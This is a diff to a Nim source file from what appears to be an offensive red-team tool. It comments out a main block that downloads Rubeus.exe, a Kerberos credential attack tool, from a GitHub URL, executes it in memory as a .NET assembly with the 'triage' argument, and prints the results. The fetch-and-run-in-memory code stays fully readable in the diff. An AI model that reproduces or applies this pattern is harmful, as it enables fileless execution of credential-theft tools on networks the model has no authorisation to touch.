@@ -46,8 +46,8 @@ proc get_assembly(url: string):string =
     let res = client.getContent(url)
     return res
 
-when isMainModule:
-    var outuot = get_assembly("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x86/Rubeus.exe")
-    var command_output = executeassembly(convertToByteSeq(outuot),["triage"],"tempfile")
-    echo $command_output
-    #echo $outuot
+#when isMainModule:
+#    var outuot = get_assembly("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x86/Rubeus.exe")
+#    var command_output = executeassembly(convertToByteSeq(outuot),["triage"],"tempfile")
+#    echo $command_output
+#    #echo $outuot
